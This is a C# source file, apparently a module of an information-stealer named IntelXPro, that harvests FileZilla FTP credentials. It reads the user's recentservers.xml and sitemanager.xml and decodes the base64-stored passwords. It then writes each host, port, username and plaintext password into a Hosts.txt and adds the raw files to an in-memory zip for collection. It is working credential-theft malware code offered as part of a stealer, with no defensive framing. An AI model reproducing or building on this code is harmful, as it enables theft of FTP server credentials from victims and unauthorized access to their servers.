using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FileZilla : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
            string[] array = new string[2]
            {
            text + "recentservers.xml",
            text + "sitemanager.xml"
            };
            if (!File.Exists(array[0]) && !File.Exists(array[1]))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "FileZilla";
            List<string> list = new List<string>();
            string[] array2 = array;
            foreach (string text2 in array2)
            {
                if (!File.Exists(text2))
                {
                    continue;
                }
                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.Load(text2);
                foreach (XmlNode item in xmlDocument.GetElementsByTagName("Server"))
                {
                    string text3 = item?["Pass"]?.InnerText;
                    if (!string.IsNullOrEmpty(text3))
                    {
                        string text4 = "ftp://" + item["Host"]?.InnerText + ":" + item["Port"]?.InnerText + "/";
                        string text5 = item["User"]?.InnerText;
                        string text6 = Encoding.UTF8.GetString(Convert.FromBase64String(text3));
                        list.Add("Url: " + text4 + "\nUsername: " + text5 + "\nPassword: " + text6);
                    }
                }
                string text7 = "FileZilla\\" + Path.GetFileName(text2);
                zip.AddFile(text7, File.ReadAllBytes(text2));
                counterApplications.Files.Add(text2 + " => " + text7);
            }
            string text8 = "FileZilla\\Hosts.txt";
            counterApplications.Files.Add(text8 ?? "");
            zip.AddTextFile(text8, string.Join("\n\n", list.ToArray()));
            counter.Applications.Add(counterApplications);
        }
    }
}
